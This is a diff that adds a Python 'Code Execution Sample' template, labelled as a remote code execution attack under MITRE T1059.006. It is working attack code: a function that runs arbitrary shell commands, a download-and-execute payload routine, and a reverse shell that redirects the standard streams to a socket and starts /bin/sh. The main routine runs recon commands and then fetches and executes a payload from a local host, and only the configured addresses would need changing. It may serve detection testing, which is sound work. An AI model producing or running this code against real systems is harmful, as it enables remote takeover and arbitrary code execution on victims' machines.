@@ -1,0 +1,183 @@
+# Code Execution Sample - Template v2.0
+# Language: Python
+# Attack Type: Remote Code Execution
+# MITRE ATT&CK: T1059.006 (Command and Scripting Interpreter: Python)
+
+import subprocess
+import sys
+import os
+from pathlib import Path
+
+def execute_command(cmd, timeout=30):
+    """执行系统命令"""
+    try:
+        result = subprocess.run(
+            cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=timeout
+        )
+        return {
+            'stdout': result.stdout,
+            'stderr': result.stderr,
+            'returncode': result.returncode
+        }
+    except subprocess.TimeoutExpired:
+        return {'error': 'Command timed out'}
+    except Exception as e:
+        return {'error': str(e)}
+
+def download_payload(url):
+    """下载远程 payload"""
+    try:
+        import requests
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            return response.text
+        else:
+            return None
+    except ImportError:
+        # 回退到 urllib
+        try:
+            import urllib.request
+            with urllib.request.urlopen(url, timeout=10) as f:
+                return f.read().decode()
+        except Exception:
+            return None
+    except Exception:
+        return None
+
+def execute_python_code(code):
+    """执行 Python 代码"""
+    try:
+        # 创建临时文件
+        import tempfile
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+            f.write(code)
+            temp_file = f.name
+        
+        # 执行
+        result = subprocess.run(
+            [sys.executable, temp_file],
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+        
+        # 清理
+        try:
+            os.unlink(temp_file)
+        except:
+            pass
+        
+        return {
+            'stdout': result.stdout,
+            'stderr': result.stderr,
+            'returncode': result.returncode
+        }
+    except Exception as e:
+        return {'error': str(e)}
+
+def reverse_shell(host, port):
+    """建立反向 Shell"""
+    import socket
+    
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+        
+        # 重定向标准流
+        os.dup2(s.fileno(), 0)  # stdin
+        os.dup2(s.fileno(), 1)  # stdout
+        os.dup2(s.fileno(), 2)  # stderr
+        
+        # 执行 shell
+        subprocess.call(["/bin/sh", "-i"])
+        
+        return True
+    except Exception as e:
+        return {'error': str(e)}
+
+def collect_output(result):
+    """收集执行结果"""
+    output = {
+        'success': False,
+        'data': None,
+        'error': None
+    }
+    
+    if 'error' in result:
+        output['error'] = result['error']
+    else:
+        output['success'] = result['returncode'] == 0
+        output['data'] = {
+            'stdout': result['stdout'],
+            'stderr': result['stderr'],
+            'returncode': result['returncode']
+        }
+    
+    return output
+
+def main():
+    """主函数"""
+    # 配置
+    PAYLOAD_URL = "http://127.0.0.1:8080/payload.py"
+    REVERSE_SHELL_HOST = "127.0.0.1"
+    REVERSE_SHELL_PORT = 4444
+    
+    print("=" * 60)
+    print("Code Execution Sample v2.0")
+    print("=" * 60)
+    print()
+    
+    # 测试本地命令执行
+    print("[*] Testing local command execution...")
+    test_commands = [
+        "whoami",
+        "pwd",
+        "uname -a",
+        "ls -la",
+    ]
+    
+    for cmd in test_commands:
+        print(f"    Executing: {cmd}")
+        result = execute_command(cmd)
+        output = collect_output(result)
+        
+        if output['success']:
+            print(f"    ✓ Success")
+            if output['data']['stdout']:
+                lines = output['data']['stdout'].strip().split('\n')
+                for line in lines[:3]:  # 仅显示前 3 行
+                    print(f"      {line}")
+        else:
+            print(f"    ✗ Failed: {output.get('error', 'Unknown error')}")
+        print()
+    
+    # 下载并执行 payload (示例)
+    print(f"[*] Attempting to download payload from: {PAYLOAD_URL}")
+    payload = download_payload(PAYLOAD_URL)
+    
+    if payload:
+        print("    ✓ Payload downloaded")
+        print(f"    Payload size: {len(payload)} bytes")
+        
+        print("    Executing payload...")
+        result = execute_python_code(payload)
+        output = collect_output(result)
+        
+        if output['success']:
+            print("    ✓ Payload executed successfully")
+        else:
+            print(f"    ✗ Execution failed: {output.get('error', 'Unknown')}")
+    else:
+        print("    ✗ Failed to download payload (expected in test environment)")
+    
+    print()
+    print("=" * 60)
+    print("Code execution complete!")
+    print("=" * 60)
+
+if __name__ == '__main__':
+    main()
